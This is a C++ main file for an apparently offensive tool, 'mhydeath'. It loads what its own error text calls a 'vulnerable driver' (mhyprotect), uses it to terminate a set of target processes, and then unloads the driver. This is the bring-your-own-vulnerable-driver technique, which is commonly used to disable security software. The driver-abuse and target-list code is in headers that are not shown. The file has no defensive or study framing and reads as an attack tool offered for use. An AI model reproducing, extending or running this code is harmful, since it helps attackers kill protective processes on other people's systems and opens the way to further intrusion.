#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include "mhyprotect/mhyprotect.h"
#include "mhydeath/process_killer.h"

/**
 * @brief Main entry point for the application
 * 
 * @param argc Argument count
 * @param argv Argument values
 * @return int Exit code
 */
int main(int argc, const char** argv) {
    try {
        // Clean previous instances
        std::cout << "[*] Cleaning previous instances..." << std::endl;
        mhyprotect::clean();

        // Initialize protection service
        std::cout << "[*] Initializing service..." << std::endl;
        if (!mhyprotect::init()) {
            throw std::runtime_error("Failed to initialize vulnerable driver");
        }

        // Initialize driver implementations
        std::cout << "[*] Initializing driver implementations..." << std::endl;
        if (!mhyprotect::driver_impl::driver_init()) {
            mhyprotect::unload();
            throw std::runtime_error("Failed to initialize driver properly");
        }

        // Kill target processes
        std::cout << "[*] Targeting and terminating processes..." << std::endl;
        process_killer::kill_target_processes();

        // Stop and delete service
        std::cout << "[*] Cleaning up..." << std::endl;
        mhyprotect::unload();

        std::cout << "[+] Operation completed successfully" << std::endl;
        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "[!] Error: " << e.what() << std::endl;
        return -1;
    }
    catch (...) {
        std::cerr << "[!] Unknown error occurred" << std::endl;
        return -1;
    }
}
